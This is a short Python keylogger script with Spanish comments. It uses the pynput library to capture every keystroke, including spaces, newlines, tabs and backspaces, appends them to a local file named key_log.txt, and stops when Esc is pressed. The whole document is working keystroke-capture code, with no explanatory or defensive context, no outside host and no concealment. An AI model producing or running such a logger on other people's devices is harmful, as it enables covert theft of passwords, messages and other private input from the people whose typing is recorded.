from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        # Si la tecla tiene un atributo 'char' (tecla normal)
        if hasattr(key, 'char'):
            with open(log_file, "a") as f:
                f.write(key.char)
        else:
            # Capturar teclas especiales
            if key == keyboard.Key.space:
                with open(log_file, "a") as f:
                    f.write(' ')
            elif key == keyboard.Key.enter:
                with open(log_file, "a") as f:
                    f.write('\n')
            elif key == keyboard.Key.tab:
                with open(log_file, "a") as f:
                    f.write('\t')
            elif key == keyboard.Key.backspace:
                with open(log_file, "a") as f:
                    f.write('\b')
    except Exception as e:
        print(f"Error: {e}")

    if key == keyboard.Key.esc:
        return False  # Para detener el listener al presionar 'Esc'

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
